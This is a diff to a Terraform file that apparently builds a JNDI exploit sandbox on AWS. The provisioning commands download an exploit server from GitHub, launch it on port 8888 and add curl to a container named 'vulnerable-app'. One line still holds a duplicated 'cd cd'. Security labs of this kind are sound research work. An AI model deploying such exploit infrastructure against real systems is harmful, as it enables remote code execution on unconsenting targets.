@@ -154,9 +154,9 @@ resource "aws_instance" "kat-JNDI-sandbox" {
       "sudo yum install java-1.8.0-openjdk -y",
       "wget https://github.com/KatTraxler/JNDI-Exploit-Server/archive/refs/heads/main.zip",
       "unzip main.zip",
-      "cd cd JNDI-Exploit-Server-main/"
+      "cd cd JNDI-Exploit-Server-main/",
       "MY_IP=$(hostname -I | awk '{print $1}')",
-      "java -jar JNDIExploit-1.2-SNAPSHOT.jar  -i $MY_IP -p 8888",
+      "java -jar JNDIExploit-1.2-SNAPSHOT.jar  -i $(hostname -I | awk '{print $1}') -p 8888",
       "sudo docker exec vulnerable-app apk add curl",
       "exit 0",
     ]
